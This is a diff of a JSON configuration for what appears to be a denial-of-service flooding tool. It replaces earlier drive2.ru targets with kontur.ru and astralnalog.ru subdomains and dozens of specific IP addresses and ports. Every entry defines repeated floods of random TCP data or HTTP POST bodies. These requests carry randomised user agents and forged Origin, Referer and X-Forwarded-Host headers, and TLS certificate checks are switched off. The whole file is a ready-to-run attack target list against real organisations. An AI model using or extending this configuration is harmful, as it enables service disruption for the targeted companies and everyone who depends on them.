@@ -8,17 +8,124 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "https://drive2.ru/",
+            "count": 16,
+            "name": "tcp://91.239.5.75:7777",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "drive2.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
+                        "address": "91.239.5.75:7777"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
                         }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.203.229:5672",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.203.229:5672"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://91.239.5.78:7777",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.239.5.78:7777"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://77.244.212.51:8443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.244.212.51:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://82.146.56.128:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "82.146.56.128:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "http://auth.kontur.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "auth.kontur.ru:80"
                     }
                 },
                 "packet": {
@@ -26,7 +133,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://drive2.ru/",
+                            "path": "http://auth.kontur.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +146,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://drive2.ru/",
-                                "Referer": "https://drive2.ru/",
-                                "X-Forwarded-Host": "drive2.ru",
+                                "Origin": "http://auth.kontur.ru",
+                                "Referer": "http://auth.kontur.ru",
+                                "X-Forwarded-Host": "auth.kontur.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,14 +159,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.82:444",
+            "count": 16,
+            "name": "tcp://213.159.213.140:22",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.82:444"
+                        "address": "213.159.213.140:22"
                     }
                 },
                 "packet": {
@@ -74,14 +181,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.77:80",
+            "count": 16,
+            "name": "tcp://46.17.203.229:2222",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.77:80"
+                        "address": "46.17.203.229:2222"
                     }
                 },
                 "packet": {
@@ -96,14 +203,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.75:80",
+            "count": 16,
+            "name": "tcp://213.159.213.140:995",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.75:80"
+                        "address": "213.159.213.140:995"
                     }
                 },
                 "packet": {
@@ -118,14 +225,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.77:443",
+            "count": 16,
+            "name": "tcp://84.38.188.100:8443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.77:443"
+                        "address": "84.38.188.100:8443"
                     }
                 },
                 "packet": {
@@ -140,14 +247,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.82:80",
+            "count": 16,
+            "name": "tcp://213.159.213.140:110",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.82:80"
+                        "address": "213.159.213.140:110"
                     }
                 },
                 "packet": {
@@ -162,83 +269,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.82:443",
+            "count": 16,
+            "name": "http://ar.astralnalog.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.82:443"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.75:444",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "146.255.192.75:444"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.75:443",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "146.255.192.75:443"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 45,
-            "name": "https://api.drive2.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "api.drive2.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "ar.astralnalog.ru:80"
                     }
                 },
                 "packet": {
@@ -246,7 +284,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://api.drive2.ru",
+                            "path": "http://ar.astralnalog.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -259,9 +297,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://api.drive2.ru",
-                                "Referer": "https://api.drive2.ru",
-                                "X-Forwarded-Host": "api.drive2.ru",
+                                "Origin": "http://ar.astralnalog.ru",
+                                "Referer": "http://ar.astralnalog.ru",
+                                "X-Forwarded-Host": "ar.astralnalog.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -272,14 +310,58 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "tcp://146.255.192.77:444",
+            "count": 16,
+            "name": "https://ar.astralnalog.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "146.255.192.77:444"
+                        "address": "ar.astralnalog.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://ar.astralnalog.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://ar.astralnalog.ru",
+                                "Referer": "https://ar.astralnalog.ru",
+                                "X-Forwarded-Host": "ar.astralnalog.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://31.44.83.184:26101",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "31.44.83.184:26101"
                     }
                 },
                 "packet": {
@@ -294,14 +376,102 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "https://shop.drive2.ru",
+            "count": 16,
+            "name": "tcp://46.17.203.229:8443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "shop.drive2.ru:443",
+                        "address": "46.17.203.229:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.203.229:8001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.203.229:8001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.204.1:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.204.1:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://77.244.212.51:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.244.212.51:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://ofd-test.kontur.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "ofd-test.kontur.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -312,7 +482,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://shop.drive2.ru",
+                            "path": "https://ofd-test.kontur.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -325,9 +495,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://shop.drive2.ru",
-                                "Referer": "https://shop.drive2.ru",
-                                "X-Forwarded-Host": "shop.drive2.ru",
+                                "Origin": "https://ofd-test.kontur.ru",
+                                "Referer": "https://ofd-test.kontur.ru",
+                                "X-Forwarded-Host": "ofd-test.kontur.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -338,14 +508,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "https://www.drive2.ru/",
+            "count": 16,
+            "name": "https://auth.kontur.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "www.drive2.ru:443",
+                        "address": "auth.kontur.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -356,7 +526,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://www.drive2.ru/",
+                            "path": "https://auth.kontur.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -369,9 +539,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.drive2.ru/",
-                                "Referer": "https://www.drive2.ru/",
-                                "X-Forwarded-Host": "www.drive2.ru",
+                                "Origin": "https://auth.kontur.ru",
+                                "Referer": "https://auth.kontur.ru",
+                                "X-Forwarded-Host": "auth.kontur.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -382,17 +552,14 @@
         },
         {
             "type": "packetgen",
-            "count": 45,
-            "name": "https://upload-www.drive2.ru",
+            "count": 16,
+            "name": "http://operator.astralnalog.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "upload-www.drive2.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "operator.astralnalog.ru:80"
                     }
                 },
                 "packet": {
@@ -400,7 +567,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://upload-www.drive2.ru",
+                            "path": "http://operator.astralnalog.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -413,9 +580,553 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://upload-www.drive2.ru",
-                                "Referer": "https://upload-www.drive2.ru",
-                                "X-Forwarded-Host": "upload-www.drive2.ru",
+                                "Origin": "http://operator.astralnalog.ru",
+                                "Referer": "http://operator.astralnalog.ru",
+                                "X-Forwarded-Host": "operator.astralnalog.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.204.250:7778",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.204.250:7778"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "http://ofd-project.kontur.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "ofd-project.kontur.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://ofd-project.kontur.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://ofd-project.kontur.ru",
+                                "Referer": "http://ofd-project.kontur.ru",
+                                "X-Forwarded-Host": "ofd-project.kontur.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.203.229:5938",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.203.229:5938"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.204.250:7777",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.204.250:7777"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://docs-ofd-api.kontur.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "docs-ofd-api.kontur.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://docs-ofd-api.kontur.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://docs-ofd-api.kontur.ru",
+                                "Referer": "https://docs-ofd-api.kontur.ru",
+                                "X-Forwarded-Host": "docs-ofd-api.kontur.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.204.250:4001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.204.250:4001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://91.239.5.76:7777",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.239.5.76:7777"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://78.155.212.134:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "78.155.212.134:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://91.239.5.47:7777",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.239.5.47:7777"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.204.250:8080",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.204.250:8080"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://84.38.188.100:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "84.38.188.100:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.203.229:3128",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.203.229:3128"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://213.171.56.42:110",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "213.171.56.42:110"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://213.159.213.140:993",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "213.159.213.140:993"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://213.159.213.140:143",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "213.159.213.140:143"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.204.250:8081",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.204.250:8081"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://46.17.203.229:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "46.17.203.229:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://91.239.5.83:7777",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.239.5.83:7777"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://edo.astralnalog.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "edo.astralnalog.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://edo.astralnalog.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://edo.astralnalog.ru",
+                                "Referer": "https://edo.astralnalog.ru",
+                                "X-Forwarded-Host": "edo.astralnalog.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://213.159.213.140:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "213.159.213.140:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "http://docs-ofd-api.kontur.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "docs-ofd-api.kontur.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://docs-ofd-api.kontur.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://docs-ofd-api.kontur.ru",
+                                "Referer": "http://docs-ofd-api.kontur.ru",
+                                "X-Forwarded-Host": "docs-ofd-api.kontur.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
